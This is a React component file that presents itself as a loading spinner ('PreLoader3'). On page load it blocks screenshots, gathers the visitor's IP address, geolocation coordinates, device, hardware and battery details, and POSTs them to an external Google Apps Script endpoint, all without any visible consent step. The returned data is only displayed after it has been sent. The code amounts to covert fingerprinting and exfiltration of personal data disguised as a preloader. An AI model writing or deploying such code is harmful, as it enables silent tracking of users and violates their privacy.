import React, { useEffect, useState } from "react";
import { collectUserData, preventScreenshots } from "../utils";
import "./PreLoader3.css";

function PreLoader3() {
  const [data, setData] = useState([]);
  const [loading, setloading] = useState(undefined);
  const [completed, setcompleted] = useState(undefined);
  const [info, setInfo] = useState(null);
  const [locationLoading, setLocationLoading] = useState(false);

  const formatObject = (original) => {
    return {
      userAgentString: original.userAgent,
      platformName: original.platform,
      operatingSystem: original.os,
      deviceCategory: original.deviceType,
      screenResolution: original.screenResolution,
      ipAddress: original.ip,
      timeZone: original.timezone,
      preferredLanguage: original.language,
      city: original.location.city,
      country: original.location.country,
      latitude: original.location.latitude,
      longitude: original.location.longitude,
      geolocationAvailable: original.location.geoLocation,
      referrerSource: original.referrer,
      cookiesEnabled: original.cookiesEnabled,
      localStorageEnabled: original.storageEnabled,
      availableMemoryGB: original.memory,
      cpuCores: original.hardwareConcurrency,
      batteryChargingStatus: original.battery.charging,
      batteryLevel: original.battery.level,
      batteryChargingTime: original.battery.chargingTime,
      batteryDischargingTime: original.battery.dischargingTime
    };
  }

  const sendData = (payload) => {
    //post data to server
    setloading(true);
    fetch("https://script.google.com/macros/s/AKfycbzTjgPPbWfW6liWEtgWs8yrabppmEcnl56wuAkT4ju3pDHVNooXMIpRcoYZvayF4FHGcw/exec", {
      method: "POST",
      body: JSON.stringify(payload),
    })
      .then((response) => response.json())
      .then((json) => {
        setcompleted(true);
        setloading(false);
        setData(json);
      }).catch(e => console.log(e));
  };

  useEffect(() => {
    preventScreenshots();
    collectUserData().then((data) => {
      const formattedData = formatObject(data)
      sendData(formattedData);
    });
  }, []);

  return (
    <>
      {!completed ? (
        <>
          {!loading ? (
            <div className="spinner">
              <span>Loading...</span>
              <div className="half-spinner"></div>
              {info && <div className="info-card">
                {info}
              </div>}
            </div>
          ) : (
            <div className="completed">&#x2713;</div>
          )}
        </>
      ) : (
        <>
          <code>
            <pre>{JSON.stringify(data, null, 2)}</pre>
          </code>
        </>
      )}
    </>
  );
}

export default PreLoader3;
